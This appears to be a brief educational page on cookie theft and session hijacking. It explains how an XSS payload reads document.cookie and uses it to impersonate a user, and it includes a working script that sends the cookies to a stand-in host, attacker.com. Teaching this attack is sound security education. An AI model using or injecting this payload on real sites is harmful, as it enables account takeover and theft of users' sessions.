Cookie Theft & Session Hijacking

Stealing session identifiers to impersonate users and gain unauthorized access.

What are Session Cookies?

Small data pieces containing a session ID, used by web applications to authenticate a user and maintain their logged-in state.

The Attack Flow

An XSS payload executes, accesses document.cookie, and sends the stolen session ID to an attacker-controlled server.

Impact: Session Hijacking

With the stolen cookie, the attacker can impersonate the victim, bypassing authentication and gaining full access to their account.

Code Example: Cookie Theft
<script>
    // Steal cookies and send to attacker's server
    var stolen_cookies = document.cookie;
    var attacker_server = 'http://attacker.com/log_cookies.php?c=';
    new Image().src = attacker_server + encodeURIComponent(stolen_cookies);
</script>
Key Takeaway

Cookie theft is a direct path to account compromise, making session management a critical security concern.
